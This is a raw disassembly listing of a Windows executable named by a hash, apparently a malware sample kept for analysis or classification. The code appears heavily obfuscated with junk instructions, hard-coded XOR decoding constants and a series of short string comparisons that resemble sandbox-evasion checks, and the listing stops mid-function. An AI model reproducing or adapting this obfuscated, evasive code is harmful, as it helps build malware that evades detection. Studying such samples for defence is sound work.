
a7a3d43202f964a34534cba03299334f8ac671a583eb681c14d1728cee20504c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
